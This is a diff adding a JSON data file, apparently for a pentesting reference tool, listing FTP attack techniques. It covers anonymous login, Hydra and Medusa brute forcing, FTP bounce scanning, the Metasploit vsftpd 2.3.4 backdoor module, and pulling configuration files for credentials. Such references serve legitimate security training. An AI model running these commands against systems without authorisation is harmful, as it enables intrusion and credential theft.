@@ -1,0 +1,154 @@
+{
+    "name": "FTP - File Transfer Protocol",
+    "port": 21,
+    "description": "File Transfer Protocol for transferring files between systems",
+    "icon": "📁",
+    "techniques": [
+        {
+            "id": "ftp-1",
+            "name": "Anonymous Login",
+            "difficulty": "Beginner",
+            "description": "Many FTP servers allow anonymous access with default credentials",
+            "steps": [
+                "Check if anonymous login is enabled",
+                "Connect using 'anonymous' as username",
+                "Use any email-like string as password",
+                "Browse and download sensitive files"
+            ],
+            "commands": [
+                {
+                    "tool": "FTP Client",
+                    "command": "ftp <target_ip>",
+                    "description": "Connect to FTP server"
+                },
+                {
+                    "tool": "Username",
+                    "command": "anonymous",
+                    "description": "Use anonymous as username"
+                },
+                {
+                    "tool": "Nmap",
+                    "command": "nmap -sV -sC -p 21 <target_ip>",
+                    "description": "Scan for FTP version and anonymous access"
+                }
+            ],
+            "tips": [
+                "Always check for hidden files with 'ls -la'",
+                "Look for backup files, config files, and credentials"
+            ]
+        },
+        {
+            "id": "ftp-2",
+            "name": "Brute Force Attack",
+            "difficulty": "Intermediate",
+            "description": "Crack FTP credentials using wordlists",
+            "steps": [
+                "Enumerate valid usernames if possible",
+                "Prepare username and password wordlists",
+                "Launch brute force attack"
+            ],
+            "commands": [
+                {
+                    "tool": "Hydra",
+                    "command": "hydra -L users.txt -P passwords.txt ftp://<target_ip>",
+                    "description": "Brute force with username and password lists"
+                },
+                {
+                    "tool": "Hydra (Single User)",
+                    "command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<target_ip>",
+                    "description": "Target specific username"
+                },
+                {
+                    "tool": "Medusa",
+                    "command": "medusa -h <target_ip> -U users.txt -P passwords.txt -M ftp",
+                    "description": "Alternative brute force tool"
+                }
+            ],
+            "tips": [
+                "Start with common credentials like admin:admin",
+                "Implement delays to avoid account lockouts"
+            ]
+        },
+        {
+            "id": "ftp-3",
+            "name": "FTP Bounce Attack",
+            "difficulty": "Advanced",
+            "description": "Use FTP server to scan internal network or bypass firewalls",
+            "steps": [
+                "Connect to vulnerable FTP server",
+                "Use PORT command to specify internal target",
+                "Map internal network through FTP"
+            ],
+            "commands": [
+                {
+                    "tool": "Nmap FTP Bounce",
+                    "command": "nmap -Pn -b anonymous@<ftp_server> <internal_target>",
+                    "description": "Use FTP server to scan internal network"
+                }
+            ],
+            "tips": [
+                "Most modern FTP servers block bounce attacks",
+                "Useful for accessing internal networks through DMZ"
+            ]
+        },
+        {
+            "id": "ftp-4",
+            "name": "Version Exploitation",
+            "difficulty": "Intermediate",
+            "description": "Exploit known vulnerabilities in specific FTP server versions",
+            "steps": [
+                "Identify FTP server version",
+                "Search for known exploits",
+                "Execute exploit against target"
+            ],
+            "commands": [
+                {
+                    "tool": "Nmap Version Scan",
+                    "command": "nmap -sV -p 21 <target_ip>",
+                    "description": "Identify FTP server version"
+                },
+                {
+                    "tool": "Searchsploit",
+                    "command": "searchsploit vsftpd 2.3.4",
+                    "description": "Search for exploits"
+                },
+                {
+                    "tool": "Metasploit",
+                    "command": "use exploit/unix/ftp/vsftpd_234_backdoor",
+                    "description": "Famous vsftpd 2.3.4 backdoor exploit"
+                }
+            ],
+            "tips": [
+                "Always verify version before attempting exploits",
+                "Check ExploitDB for recent vulnerabilities"
+            ]
+        },
+        {
+            "id": "ftp-5",
+            "name": "Configuration File Extraction",
+            "difficulty": "Beginner",
+            "description": "Download and analyze FTP server configuration files",
+            "steps": [
+                "Gain read access to FTP server",
+                "Navigate to configuration directories",
+                "Download configuration files"
+            ],
+            "commands": [
+                {
+                    "tool": "vsftpd Config",
+                    "command": "get /etc/vsftpd.conf",
+                    "description": "Download vsftpd configuration"
+                },
+                {
+                    "tool": "ProFTPD Config",
+                    "command": "get /etc/proftpd/proftpd.conf",
+                    "description": "Download ProFTPD configuration"
+                }
+            ],
+            "tips": [
+                "Look for cleartext passwords in configs",
+                "Check for chroot jail misconfigurations"
+            ]
+        }
+    ]
+}
